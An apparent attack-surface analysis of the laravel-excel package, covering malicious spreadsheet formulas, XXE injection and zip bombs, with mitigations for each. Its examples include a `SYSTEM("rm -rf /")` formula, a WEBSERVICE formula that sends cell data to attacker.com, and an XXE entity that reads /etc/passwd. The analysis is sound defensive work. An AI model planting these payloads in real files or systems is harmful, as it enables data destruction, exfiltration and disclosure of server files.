# Attack Surface Analysis for spartnernl/laravel-excel

## Attack Surface: [Malicious Excel Formulas (Import)](./attack_surfaces/malicious_excel_formulas__import_.md)

- **Description:** Attackers embed malicious Excel formulas within uploaded files. When the application processes these files using `laravel-excel`, the underlying spreadsheet library might evaluate these formulas, potentially leading to server-side code execution or data exfiltration.
- **How Laravel-Excel Contributes:** The package facilitates the parsing and processing of Excel files, including the evaluation of formulas if not explicitly disabled or sanitized.
- **Example:** An uploaded Excel file contains a cell with the formula `=SYSTEM("rm -rf /")` or `=WEBSERVICE("http://attacker.com/exfiltrate?data="&A1)`.
- **Impact:** Critical - Potential for Remote Code Execution (RCE) on the server, allowing attackers to gain full control, or data exfiltration to external sources.
- **Risk Severity:** Critical
- **Mitigation Strategies:**
    - Disable Formula Evaluation: Configure the underlying PhpSpreadsheet library (used by `laravel-excel`) to disable formula evaluation during import.
    - Sanitize Imported Data: Treat all imported data as untrusted and sanitize it before using it in the application. Avoid directly using cell values in system commands or database queries without proper escaping.
    - Run Import Processes in a Sandboxed Environment: Isolate the file processing in a restricted environment with limited permissions to minimize the impact of potential exploits.

## Attack Surface: [XML External Entity (XXE) Injection (Import)](./attack_surfaces/xml_external_entity__xxe__injection__import_.md)

- **Description:** Modern Excel files are often ZIP archives containing XML files. If the XML parsing library used by `laravel-excel` is not configured securely, attackers can craft malicious Excel files containing external entity references that can be exploited to read local files on the server or perform Server-Side Request Forgery (SSRF).
- **How Laravel-Excel Contributes:** The package handles the unpacking and parsing of the underlying XML structure of Excel files.
- **Example:** A malicious Excel file contains an XML structure referencing an external entity like `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><bar>&xxe;</bar>`.
- **Impact:** High - Potential for reading sensitive files on the server (e.g., configuration files, private keys) or performing SSRF attacks to interact with internal services.
- **Risk Severity:** High
- **Mitigation Strategies:**
    - Disable External Entities in XML Parser: Configure the underlying XML parser (likely part of PhpSpreadsheet) to disable the processing of external entities.
    - Update Dependencies: Ensure that `laravel-excel` and its underlying dependencies (especially PhpSpreadsheet) are updated to the latest versions, which often contain fixes for known XXE vulnerabilities.
    - Principle of Least Privilege: Run the application with the minimum necessary permissions to limit the impact of potential file access exploits.

## Attack Surface: [Zip Bomb/Denial of Service (DoS) (Import)](./attack_surfaces/zip_bombdenial_of_service__dos___import_.md)

- **Description:** Attackers upload specially crafted Excel files (zip bombs) that compress to a small size but expand to an extremely large size when unzipped, potentially exhausting server resources (CPU, memory, disk space) and causing a denial of service.
- **How Laravel-Excel Contributes:** The package handles the decompression of uploaded Excel files.
- **Example:** An uploaded `.xlsx` file is only a few kilobytes but expands to gigabytes of data when processed.
- **Impact:** High - Application or server becomes unresponsive, preventing legitimate users from accessing it.
- **Risk Severity:** High
- **Mitigation Strategies:**
    - Implement File Size Limits: Restrict the maximum size of uploaded Excel files.
    - Resource Limits: Configure resource limits (e.g., memory limits, time limits) for the file processing operations.
    - Monitor Resource Usage:** Implement monitoring to detect unusual resource consumption during file processing.
    - Defer Processing: Process large or untrusted files asynchronously in a separate queue or worker to prevent blocking the main application thread.
